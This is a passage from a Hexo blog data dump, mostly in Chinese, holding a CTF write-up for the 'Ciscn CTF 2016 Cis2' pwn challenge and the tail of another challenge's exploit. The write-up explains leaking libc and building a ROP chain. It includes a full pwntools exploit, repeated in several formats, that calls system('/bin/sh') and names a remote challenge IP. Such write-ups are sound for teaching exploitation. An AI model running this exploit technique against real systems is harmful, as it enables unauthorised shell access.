class=\"line\">sh=<span class=\"string\">'0804828e'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(index,value)</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tp.sendline(str(index))</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'value:'</span>)</div><div class=\"line\">\tvalue=<span class=\"string\">'0A0A0A'</span>+value</div><div class=\"line\">\tc=c_int32(int(value,<span class=\"number\">16</span>)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">reset</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">end</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'11'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wdword</span><span class=\"params\">(index,word)</span>:</span></div><div class=\"line\">\tw(index,word[<span class=\"number\">6</span>:])</div><div class=\"line\">\tw(index+<span class=\"number\">1</span>,word[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">2</span>,word[<span class=\"number\">2</span>:<span class=\"number\">4</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">3</span>,word[<span class=\"number\">0</span>:<span class=\"number\">2</span>])</div><div class=\"line\">\treset()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"string\">\"\"\"</div><div class=\"line\">\t# write print addr</div><div class=\"line\">\twdword(44,printf)</div><div class=\"line\">\twdword(48,popret)</div><div class=\"line\">\twdword(52,print_got)</div><div class=\"line\">\twdword(56,begin)</div><div class=\"line\">\t# wdword(60,popret)</div><div class=\"line\">\t# wdword(64,out)</div><div class=\"line\">\t# wdword(68,begin)</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tend()</div><div class=\"line\"></div><div class=\"line\">\trecv=p.recv(4)</div><div class=\"line\"></div><div class=\"line\">\tsys_addr=u32(recv.ljust(4,'\\x00'))</div><div class=\"line\">\tprint 'system addr: '+hex(sys_addr)</div><div class=\"line\">\tsh_addr=sys_addr-0x4cbd0+0x15d1a9</div><div class=\"line\">\tprint '/bin/sh addr: '+hex(sh_addr)</div><div class=\"line\"></div><div class=\"line\">\t# gdb.attach(p,'b *0x08048604')</div><div class=\"line\">\tp.sendline('28')</div><div class=\"line\">\tp.recvuntil('value:')</div><div class=\"line\">        value='0A0A0A00'</div><div class=\"line\">        c=c_int32(int(value,16)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\">\twdword(44,system)</div><div class=\"line\">\twdword(52,hex(sh_addr)[2:])</div><div class=\"line\">\tend()</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tp.interactive()</div><div class=\"line\">\t\"\"\"</span></div><div class=\"line\">\twdword(<span class=\"number\">44</span>,system)</div><div class=\"line\">\twdword(<span class=\"number\">52</span>,sh)</div><div class=\"line\">\tend()</div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>"},{"title":"Ciscn CTF 2016 Cis2 writeup","date":"2016-07-11T10:13:00.000Z","_content":"\n这道题最终还是本地成功远程失败，这次的原因还是too young......还是再记录一下吧。\n\n可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。\n\n<!--more-->\n\n实力懵逼：\n![ciscnctf_2016_cis2_writeup0.png][1]\n\n这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：\n\n![ciscnctf_2016_cis2_writeup1.png][2]\n\n支持的操作数有'+','-','m','w','p','n','.','q',作用很显然：\n![ciscnctf_2016_cis2_writeup2.png][3]\n\n不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:\n\n```C\nvalues=&(stack[1]);\nindex=&(stack[0]);\n```\n\n所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。\n\n麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values[1]重写移向的地址。所以想要泄漏__libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向__libc_start_main+245这个地址就可以泄漏它。\n\n于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values[1]中，再使用'w'写入0x0x7fffffffe228。这个时候再使用'p'就可以泄漏__libc_start_main+245地址。\n![ciscnctf_2016_cis2_writeup3.png][4]\n\n接下来就需要类似的方式先写入values[1]再覆盖到目标地址中的方式（当然这个时候values[1]的位置也改变了），构造ROP链触发system('/bin/sh')了。\n\n但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势......\n\n所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去......\n\n还是附上可怜的expolit：\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./cis2')\n# p=remote('106.75.37.31',23333)\n\npop_rdi_ret=int('0x400ad3',16)\n\ndef w(high,value,low):\n\t# first move down\n\tfor x in range(high):\n\t\tp.sendline('w')\n\n\t# write into stack[2]\n\tp.sendline(str(value))\n\tprint 'write value: '+hex(c_uint32(value).value)\n\t# copy into stack[1]\n\tp.sendline('m')\n\n\tfor x in range(low):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\ndef main():\n\tp.recvuntil('Fight!\\n\\n')\n\n\t# begin\n\t# first get stack addr\n\tfor x in range(33):\n\t\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\taddr=p.recvline().strip()\n\taddr=int(addr,10)\n\n\tprint 'leak stack addr: '+hex(c_uint32(addr).value)\n\tstack_addr=addr-420\n\tdest_addr=stack_addr+65*4\n\tprint 'modify base addr to: '+hex(c_uint32(dest_addr).value)\n\n\tfor x in range(9):\n\t\tp.sendline('w')\n\t# write into stack[2]\n\tp.sendline(str(dest_addr))\n\t# copy into stack[1]\n\tp.sendline('+')\n\n\tfor x in range(17):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\n\t# now values[index] should point to __libc_start_main's address prefix\n\t# first leak libc_prefix\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_prefix=p.recvline().strip()\n\tlibc_prefix=int(libc_prefix,10)\n\tprint 'leak libc prefix: '+hex(c_uint32(libc_prefix).value)\n\n\t# now leak libc other address\n\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_addr=p.recvline().strip()\n\tlibc_addr=int(libc_addr,10)\n\tprint 'leak libc addr: '+hex(c_uint32(libc_addr).value)\n\n\tlibc_addr=libc_addr-245\n\t# I used libc-database to search the version of glibc on the remote once but I get nothing.\n\t# So I failed to get shell from remote.\n\tsys_addr=libc_addr-0x21a50+0x414f0\n\tbinsh_addr=libc_addr-0x21a50+0x161160\n\n\t#################################################################################\n\n\t# write pop gadget addr into stack \n\tw(17,pop_rdi_ret,19)\n\tw(17,0,18)\n\n\t# write /bin/sh addr to target addr\n\tw(16,binsh_addr,17)\n\tw(15,libc_prefix,16)\n\n\t# write sys addr to target addr\n\tw(14,sys_addr,15)\n\tw(13,libc_prefix,14)\n\n\t# gdb.attach(p,'b *0x400987')\n\tp.sendline('q')\n\t# get shell\n\tp.interactive()\n\nmain()\n```\n\n[1]: /images/ciscnctf_2016_cis2_writeup0.png\n[2]: /images/ciscnctf_2016_cis2_writeup1.png\n[3]: /images/ciscnctf_2016_cis2_writeup2.png\n[4]: /images/ciscnctf_2016_cis2_writeup3.png\n","source":"_posts/ciscnctf_2016_cis2_writeup.md","raw":"title: Ciscn CTF 2016 Cis2 writeup\n\ndate: 2016/07/11 18:13:00\n\n---\n\n这道题最终还是本地成功远程失败，这次的原因还是too young......还是再记录一下吧。\n\n可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。\n\n<!--more-->\n\n实力懵逼：\n![ciscnctf_2016_cis2_writeup0.png][1]\n\n这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：\n\n![ciscnctf_2016_cis2_writeup1.png][2]\n\n支持的操作数有'+','-','m','w','p','n','.','q',作用很显然：\n![ciscnctf_2016_cis2_writeup2.png][3]\n\n不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:\n\n```C\nvalues=&(stack[1]);\nindex=&(stack[0]);\n```\n\n所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。\n\n麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values[1]重写移向的地址。所以想要泄漏__libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向__libc_start_main+245这个地址就可以泄漏它。\n\n于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values[1]中，再使用'w'写入0x0x7fffffffe228。这个时候再使用'p'就可以泄漏__libc_start_main+245地址。\n![ciscnctf_2016_cis2_writeup3.png][4]\n\n接下来就需要类似的方式先写入values[1]再覆盖到目标地址中的方式（当然这个时候values[1]的位置也改变了），构造ROP链触发system('/bin/sh')了。\n\n但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势......\n\n所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去......\n\n还是附上可怜的expolit：\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./cis2')\n# p=remote('106.75.37.31',23333)\n\npop_rdi_ret=int('0x400ad3',16)\n\ndef w(high,value,low):\n\t# first move down\n\tfor x in range(high):\n\t\tp.sendline('w')\n\n\t# write into stack[2]\n\tp.sendline(str(value))\n\tprint 'write value: '+hex(c_uint32(value).value)\n\t# copy into stack[1]\n\tp.sendline('m')\n\n\tfor x in range(low):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\ndef main():\n\tp.recvuntil('Fight!\\n\\n')\n\n\t# begin\n\t# first get stack addr\n\tfor x in range(33):\n\t\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\taddr=p.recvline().strip()\n\taddr=int(addr,10)\n\n\tprint 'leak stack addr: '+hex(c_uint32(addr).value)\n\tstack_addr=addr-420\n\tdest_addr=stack_addr+65*4\n\tprint 'modify base addr to: '+hex(c_uint32(dest_addr).value)\n\n\tfor x in range(9):\n\t\tp.sendline('w')\n\t# write into stack[2]\n\tp.sendline(str(dest_addr))\n\t# copy into stack[1]\n\tp.sendline('+')\n\n\tfor x in range(17):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\n\t# now values[index] should point to __libc_start_main's address prefix\n\t# first leak libc_prefix\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_prefix=p.recvline().strip()\n\tlibc_prefix=int(libc_prefix,10)\n\tprint 'leak libc prefix: '+hex(c_uint32(libc_prefix).value)\n\n\t# now leak libc other address\n\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_addr=p.recvline().strip()\n\tlibc_addr=int(libc_addr,10)\n\tprint 'leak libc addr: '+hex(c_uint32(libc_addr).value)\n\n\tlibc_addr=libc_addr-245\n\t# I used libc-database to search the version of glibc on the remote once but I get nothing.\n\t# So I failed to get shell from remote.\n\tsys_addr=libc_addr-0x21a50+0x414f0\n\tbinsh_addr=libc_addr-0x21a50+0x161160\n\n\t#################################################################################\n\n\t# write pop gadget addr into stack \n\tw(17,pop_rdi_ret,19)\n\tw(17,0,18)\n\n\t# write /bin/sh addr to target addr\n\tw(16,binsh_addr,17)\n\tw(15,libc_prefix,16)\n\n\t# write sys addr to target addr\n\tw(14,sys_addr,15)\n\tw(13,libc_prefix,14)\n\n\t# gdb.attach(p,'b *0x400987')\n\tp.sendline('q')\n\t# get shell\n\tp.interactive()\n\nmain()\n```\n\n[1]: /images/ciscnctf_2016_cis2_writeup0.png\n[2]: /images/ciscnctf_2016_cis2_writeup1.png\n[3]: /images/ciscnctf_2016_cis2_writeup2.png\n[4]: /images/ciscnctf_2016_cis2_writeup3.png\n","slug":"ciscnctf_2016_cis2_writeup","published":1,"updated":"2016-11-01T13:30:59.088Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuzk2oka0001r160homano1y","content":"<p>这道题最终还是本地成功远程失败，这次的原因还是too young……还是再记录一下吧。</p>\n<p>可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。</p>\n<a id=\"more\"></a>\n<p>实力懵逼：<br><img src=\"/images/ciscnctf_2016_cis2_writeup0.png\" alt=\"ciscnctf_2016_cis2_writeup0.png\"></p>\n<p>这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：</p>\n<p><img src=\"/images/ciscnctf_2016_cis2_writeup1.png\" alt=\"ciscnctf_2016_cis2_writeup1.png\"></p>\n<p>支持的操作数有’+’,’-‘,’m’,’w’,’p’,’n’,’.’,’q’,作用很显然：<br><img src=\"/images/ciscnctf_2016_cis2_writeup2.png\" alt=\"ciscnctf_2016_cis2_writeup2.png\"></p>\n<p>不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">values=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">1</span>]);</div><div class=\"line\">index=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">0</span>]);</div></pre></td></tr></table></figure>\n<p>所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。</p>\n<p>麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>重写移向的地址。所以想要泄漏<strong>libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向</strong>libc_start_main+245这个地址就可以泄漏它。</p>\n<p>于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>中，再使用’w’写入0x0x7fffffffe228。这个时候再使用’p’就可以泄漏__libc_start_main+245地址。<br><img src=\"/images/ciscnctf_2016_cis2_writeup3.png\" alt=\"ciscnctf_2016_cis2_writeup3.png\"></p>\n<p>接下来就需要类似的方式先写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>再覆盖到目标地址中的方式（当然这个时候values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>的位置也改变了），构造ROP链触发system(‘/bin/sh’)了。</p>\n<p>但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势……</p>\n<p>所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去……</p>\n<p>还是附上可怜的expolit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./cis2'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.37.31',23333)</span></div><div class=\"line\"></div><div class=\"line\">pop_rdi_ret=int(<span class=\"string\">'0x400ad3'</span>,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(high,value,low)</span>:</span></div><div class=\"line\">\t<span class=\"comment\"># first move down</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(high):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(value))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'write value: '</span>+hex(c_uint32(value).value)</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'m'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(low):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Fight!\\n\\n'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># begin</span></div><div class=\"line\">\t<span class=\"comment\"># first get stack addr</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\taddr=p.recvline().strip()</div><div class=\"line\">\taddr=int(addr,<span class=\"number\">10</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak stack addr: '</span>+hex(c_uint32(addr).value)</div><div class=\"line\">\tstack_addr=addr<span class=\"number\">-420</span></div><div class=\"line\">\tdest_addr=stack_addr+<span class=\"number\">65</span>*<span class=\"number\">4</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'modify base addr to: '</span>+hex(c_uint32(dest_addr).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">9</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(dest_addr))</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'+'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">17</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now values[index] should point to __libc_start_main's address prefix</span></div><div class=\"line\">\t<span class=\"comment\"># first leak libc_prefix</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_prefix=p.recvline().strip()</div><div class=\"line\">\tlibc_prefix=int(libc_prefix,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc prefix: '</span>+hex(c_uint32(libc_prefix).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now leak libc other address</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_addr=p.recvline().strip()</div><div class=\"line\">\tlibc_addr=int(libc_addr,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc addr: '</span>+hex(c_uint32(libc_addr).value)</div><div class=\"line\"></div><div class=\"line\">\tlibc_addr=libc_addr<span class=\"number\">-245</span></div><div class=\"line\">\t<span class=\"comment\"># I used libc-database to search the version of glibc on the remote once but I get nothing.</span></div><div class=\"line\">\t<span class=\"comment\"># So I failed to get shell from remote.</span></div><div class=\"line\">\tsys_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x414f0</span></div><div class=\"line\">\tbinsh_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x161160</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">#################################################################################</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write pop gadget addr into stack </span></div><div class=\"line\">\tw(<span class=\"number\">17</span>,pop_rdi_ret,<span class=\"number\">19</span>)</div><div class=\"line\">\tw(<span class=\"number\">17</span>,<span class=\"number\">0</span>,<span class=\"number\">18</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write /bin/sh addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">16</span>,binsh_addr,<span class=\"number\">17</span>)</div><div class=\"line\">\tw(<span class=\"number\">15</span>,libc_prefix,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write sys addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">14</span>,sys_addr,<span class=\"number\">15</span>)</div><div class=\"line\">\tw(<span class=\"number\">13</span>,libc_prefix,<span class=\"number\">14</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># gdb.attach(p,'b *0x400987')</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'q'</span>)</div><div class=\"line\">\t<span class=\"comment\"># get shell</span></div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>\n","excerpt":"<p>这道题最终还是本地成功远程失败，这次的原因还是too young……还是再记录一下吧。</p>\n<p>可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。</p>","more":"<p>实力懵逼：<br><img src=\"/images/ciscnctf_2016_cis2_writeup0.png\" alt=\"ciscnctf_2016_cis2_writeup0.png\"></p>\n<p>这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：</p>\n<p><img src=\"/images/ciscnctf_2016_cis2_writeup1.png\" alt=\"ciscnctf_2016_cis2_writeup1.png\"></p>\n<p>支持的操作数有’+’,’-‘,’m’,’w’,’p’,’n’,’.’,’q’,作用很显然：<br><img src=\"/images/ciscnctf_2016_cis2_writeup2.png\" alt=\"ciscnctf_2016_cis2_writeup2.png\"></p>\n<p>不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">values=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">1</span>]);</div><div class=\"line\">index=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">0</span>]);</div></pre></td></tr></table></figure>\n<p>所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。</p>\n<p>麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>重写移向的地址。所以想要泄漏<strong>libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向</strong>libc_start_main+245这个地址就可以泄漏它。</p>\n<p>于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>中，再使用’w’写入0x0x7fffffffe228。这个时候再使用’p’就可以泄漏__libc_start_main+245地址。<br><img src=\"/images/ciscnctf_2016_cis2_writeup3.png\" alt=\"ciscnctf_2016_cis2_writeup3.png\"></p>\n<p>接下来就需要类似的方式先写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>再覆盖到目标地址中的方式（当然这个时候values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>的位置也改变了），构造ROP链触发system(‘/bin/sh’)了。</p>\n<p>但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势……</p>\n<p>所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去……</p>\n<p>还是附上可怜的expolit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div 